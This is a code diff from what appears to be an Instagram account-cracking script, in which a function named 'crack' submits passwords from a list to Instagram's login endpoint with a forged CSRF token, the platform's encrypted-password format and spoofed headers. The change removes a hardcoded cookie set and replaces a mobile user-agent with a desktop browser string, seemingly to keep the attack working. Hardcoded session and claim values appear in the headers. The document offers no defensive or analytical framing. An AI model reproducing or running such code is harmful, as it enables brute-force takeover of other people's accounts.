@@ -107,13 +107,6 @@ def crack(uid, password_list, total_count):
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            cookies = {
-            'csrftoken': csrftoken,
-            'datr': 'SehHaXwOCk9GiWPH3fNZWglz',
-            'ig_did': str(uuid.uuid4()).upper(),
-            'mid': 'aUfoSwALAAG_fJ1ItrV9b-sb7DCg',
-            'ig_nrcb': '1',
-            'wd': '1136x773',}
             headers = {
             'Host': 'i.instagram.com',
             'content-length': '1212',
@@ -122,7 +115,7 @@ def crack(uid, password_list, total_count):
             'x-ig-www-claim': 'hmac.AR3mzTXmWJQaei0IjdtQkJIZZIkfif5qOU0tUpKo_5EceiMR',
             'sec-ch-ua-mobile': '?1',
             'x-instagram-ajax': '1010361788',
-            'user-agent': 'Instagram 320.0.0.40.101 (iPhone14,5; iOS 17_1; en_US; scale=3.00; 1170x2532) Android 31 Xiaomi RedmiNote10',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
             'viewport-width': '421',
             'content-type': 'application/x-www-form-urlencoded',
             'accept': '*/*',
